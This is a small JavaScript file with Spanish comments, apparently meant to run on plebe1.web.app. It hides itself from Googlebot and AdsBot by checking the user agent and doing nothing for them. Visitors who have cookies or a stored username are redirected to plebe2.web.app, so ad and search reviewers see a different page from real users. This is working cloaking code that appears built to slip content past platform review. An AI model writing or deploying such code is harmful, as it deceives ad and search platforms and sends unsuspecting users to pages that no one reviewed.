// Función para detectar si el usuario es un bot de Google
function esBot() {
    const userAgent = navigator.userAgent.toLowerCase();
    return userAgent.includes('googlebot') || userAgent.includes('adsbot');
}

// Función principal para manejar la redirección
function manejarRedireccion() {
    if (esBot()) {
        // Si es un bot, no hacemos nada
        return;
    }

    // Verificar si hay datos en localStorage
    const clave = 'nombreUsuario';
    const usuarioAlmacenado = localStorage.getItem(clave);

    // Verificar si hay cookies
    const hayCookies = document.cookie.length > 0;

    if (usuarioAlmacenado || hayCookies) {
        // Si hay datos en localStorage o cookies, redirigir
        window.location.href = 'https://plebe2.web.app/';
    } else {
        // Si no hay datos, no hacemos nada y la página se carga normalmente
        console.log("No hay datos en localStorage ni cookies. Manteniéndose en plebe1.web.app/");
    }
}

// Ejecutar la función al cargar el script
manejarRedireccion();
